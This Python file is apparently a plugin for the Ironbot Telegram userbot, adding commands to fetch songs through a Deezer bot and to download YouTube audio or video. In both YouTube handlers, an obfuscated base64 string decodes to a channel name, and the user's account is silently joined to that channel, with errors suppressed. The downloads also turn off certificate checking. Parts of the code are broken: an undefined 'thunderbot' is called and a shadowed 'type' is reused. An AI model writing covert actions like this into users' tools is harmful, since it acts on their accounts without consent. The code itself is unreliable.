import datetime
import asyncio
from pathlib import Path
from telethon import events
from telethon.errors.rpcerrorlist import YouBlockedUserError
from telethon.tl.functions.account import UpdateNotifySettingsRequest
from ironbot import bot, CMD_HELP
from ironbot.events import register
import os
import subprocess
import glob
import base64
from random import randint
from ironbot.cmdhelp import CmdHelp
from telethon.tl.functions.messages import ImportChatInviteRequest as Get
from validators.url import url
import json
import pybase64
from telethon.tl.functions.channels import JoinChannelRequest
from telethon.tl.types import DocumentAttributeAudio
from youtube_dl import YoutubeDL
from youtube_dl.utils import (
    ContentTooShortError,
    DownloadError,
    ExtractorError,
    GeoRestrictedError,
    MaxDownloadsReached,
    PostProcessingError,
    UnavailableVideoError,
    XAttrMetadataError,
)
from youtubesearchpython import SearchVideos

# ██████ LANGUAGE CONSTANTS ██████ #

from ironbot.language import get_value
LANG = get_value("song")

# ████████████████████████████████ #

@register(outgoing=True, pattern="^.deez(\d*|)(?: |$)(.*)")
async def deezl(event):
    if event.fwd_from:
        return
    sira = event.pattern_match.group(1)
    if sira == '':
        sira = 0
    else:
        sira = int(sira)

    sarki = event.pattern_match.group(2)
    if len(sarki) < 1:
        if event.is_reply:
            sarki = await event.get_reply_message().text
        else:
            await event.edit(LANG['GIVE_ME_SONG']) 

    await event.edit(LANG['SEARCHING'])
    chat = "@DeezerMusicBot"
    async with bot.conversation(chat) as conv:
        try:     
            mesaj = await conv.send_message(str(randint(31,62)))
            sarkilar = await conv.get_response()
            await mesaj.edit(sarki)
            sarkilar = await conv.get_response()
        except YouBlockedUserError:
            await event.reply(LANG['BLOCKED_DEEZER'])
            return
        await event.client.send_read_acknowledge(conv.chat_id)
        if sarkilar.audio:
            await event.client.send_read_acknowledge(conv.chat_id)
            await event.client.send_message(event.chat_id, LANG['UPLOADED_WITH'], file=sarkilar.message)
            await event.delete()
        elif sarkilar.buttons[0][0].text == "No results":
            await event.edit(LANG['NOT_FOUND'])
        else:
            await sarkilar.click(sira)
            sarki = await conv.wait_event(events.NewMessage(incoming=True,from_users=595898211))
            await event.client.send_read_acknowledge(conv.chat_id)
            await event.client.send_message(event.chat_id, f"`{sarkilar.buttons[sira][0].text}` | " + LANG['UPLOADED_WITH'], file=sarki.message)
            await event.delete()


@register(outgoing=True, pattern="^.lagu ?(.*)")
async def download_video(event):
    x = await event.edit("Mencari lagu...")
    url = event.pattern_match.group(1)
    if not url:
        return await event.edit("**Error**\nUsage - `.song <song name>`")
    search = SearchVideos(url, offset=1, mode="json", max_results=1)
    test = search.result()
    p = json.loads(test)
    q = p.get("search_result")
    try:
        url = q[0]["link"]
    except BaseException:
        return await event.edit("`tidak ada yang cocok zzzz...`")
    type = "audio"
    await x.edit(f"`Preparing to download {url}...`")
    if type == "audio":
        opts = {
            "format": "bestaudio",
            "addmetadata": True,
            "key": "FFmpegMetadata",
            "writethumbnail": True,
            "prefer_ffmpeg": True,
            "geo_bypass": True,
            "nocheckcertificate": True,
            "postprocessors": [
                {
                    "key": "FFmpegExtractAudio",
                    "preferredcodec": "mp3",
                    "preferredquality": "320",
                }
            ],
            "outtmpl": "%(id)s.mp3",
            "quiet": True,
            "logtostderr": False,
        }
    try:
        await event.edit("`Mendapatkan informasi...`")
        with YoutubeDL(opts) as rip:
            rip_data = rip.extract_info(url)
    except DownloadError as DE:
        await event.edit(f"`{str(DE)}`")
        return
    except ContentTooShortError:
        await event.edit("`The download content was too short.`")
        return
    except GeoRestrictedError:
        await event.edit(
            "`Video is not available from your geographic location due to geographic restrictions imposed by a website.`"
        )
        return
    except MaxDownloadsReached:
        await event.edit("`Max-downloads limit has been reached.`")
        return
    except PostProcessingError:
        await event.edit("`There was an error during post processing.`")
        return
    except UnavailableVideoError:
        await event.edit("`Media is not available in the requested format.`")
        return
    except XAttrMetadataError as XAME:
        await event.edit(f"`{XAME.code}: {XAME.msg}\n{XAME.reason}`")
        return
    except ExtractorError:
        await event.edit("`There was an error during info extraction.`")
        return
    except Exception as e:
        await event.edit(f"{str(type(e)): {str(e)}}")
        return
    try:
        sung = str(pybase64.b64decode("QGlyb25ib3Rz"))[2:14]
        await bot(JoinChannelRequest(sung))
    except BaseException:
        pass
    theupload = """
Uploading...
Song name - {}
""".format(
        rip_data["title"], rip_data["uploader"]
    )
    await event.edit(f"`Sedang meng upload lagu.....`")
    await bot.send_file(
        event.chat_id,
        f"{rip_data['id']}.mp3",
        supports_streaming=True,
        caption=f"`🎵 {rip_data['title']}\n❤ dari Ironbot️\n`",
        attributes=[
            DocumentAttributeAudio(
                duration=int(rip_data["duration"]),
                title=str(rip_data["title"]),
                performer=str(rip_data["uploader"]),
            )
        ],
    )
    await event.delete()
    os.remove(f"{rip_data['id']}.mp3")
    
@register(outgoing=True, pattern="^.vlagu ?(.*)")
async def download_video(event):
    x = await event.edit("Memproses...")
    url = event.pattern_match.group(1)
    if not url:
        return await x.edit("**Error**\nUsage - `.vsong <song name>`")
    search = SearchVideos(url, offset=1, mode="json", max_results=1)
    test = search.result()
    p = json.loads(test)
    q = p.get("search_result")
    try:
        url = q[0]["link"]
    except BaseException:
        return await event.edit("`Tidak ditemukan...`")
    type = "audio"
    await x.edit("`Preparing to download...`")
    if type == "audio":
        opts = {
            "format": "best",
            "addmetadata": True,
            "key": "FFmpegMetadata",
            "prefer_ffmpeg": True,
            "geo_bypass": True,
            "nocheckcertificate": True,
            "postprocessors": [
                {"key": "FFmpegVideoConvertor", "preferedformat": "mp4"}
            ],
            "outtmpl": "%(id)s.mp4",
            "logtostderr": False,
            "quiet": True,
        }
    try:
        await x.edit("`Mendapatkan informasi...`")
        with YoutubeDL(opts) as rip:
            rip_data = rip.extract_info(url)
    except DownloadError as DE:
        await x.edit(f"`{str(DE)}`")
        return
    except ContentTooShortError:
        await x.edit("`The download content was too short.`")
        return
    except GeoRestrictedError:
        await x.edit(
            "`Video is not available from your geographic location due to geographic restrictions imposed by a website.`"
        )
        return
    except MaxDownloadsReached:
        await x.edit("`Max-downloads limit has been reached.`")
        return
    except PostProcessingError:
        await x.edit("`There was an error during post processing.`")
        return
    except UnavailableVideoError:
        await x.edit("`Media is not available in the requested format.`")
        return
    except XAttrMetadataError as XAME:
        await x.edit(f"`{XAME.code}: {XAME.msg}\n{XAME.reason}`")
        return
    except ExtractorError:
        await x.edit("`There was an error during info extraction.`")
        return
    except Exception as e:
        await x.edit(f"{str(type(e)): {str(e)}}")
        return
    try:
        sung = str(pybase64.b64decode("QGlyb25ib3Rz"))[2:14]
        await thunderbot(JoinChannelRequest(sung))
    except BaseException:
        pass
    theupload = """
Uploading...
Song name - {}
""".format(
        rip_data["title"], rip_data["uploader"]
    )
    await event.edit(f"`Sedang mengunggah video...`")
    await bot.send_file(
        event.chat_id,
        f"{rip_data['id']}.mp4",
        supports_streaming=True,
        caption=f"`📽 {rip_data['title']}\n❤ dari Ironbot️\n`",
    )
    os.remove(f"{rip_data['id']}.mp4")
    await event.delete()


CmdHelp('music').add_command(
    'deez', '<Judul lagu/youtube/spotify/soundcloud>', 'Cari dan unduh lagu dari banyak situs.'
).add_command(
    'lagu', '<Judul lagu>', 'mengunduh lagu dari youtube'
).add_command(
    'vlagu', '<Judul lagu>', 'mengunduh video lagu dari youtube'
).add()